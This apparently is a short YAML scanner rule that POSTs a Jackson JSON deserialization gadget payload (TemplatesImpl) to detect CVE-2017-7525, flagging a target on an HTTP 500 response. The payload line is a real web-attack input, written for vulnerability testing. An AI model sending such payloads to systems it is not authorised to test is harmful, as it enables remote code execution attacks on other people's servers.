collect:
  - uniq:
    - [ URI ]
modify:
  - "HEADER_CONTENT-TYPE_value": "application/json"
generate:
  - into:
    - 'POST_value'
  - payload:
    - '{"Wall":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":[""],"transletName":"a","outputProperties":"r","_name":"m","_version":"1.00","allowedProtocols":"all"}]}}'
  - method:
    - replace
detect:
  - response:
    - body: "<title>HTTP Status 500 â€“ Internal Server Error</title>"
meta-info:
  - type: rce
  - threat: 90
  - tags:
    - RCE
    - Remote Code Execution
    - CVE-2017-7525
    - Apache Struts 2.5 - 2.5.14
    - Jackson JSON library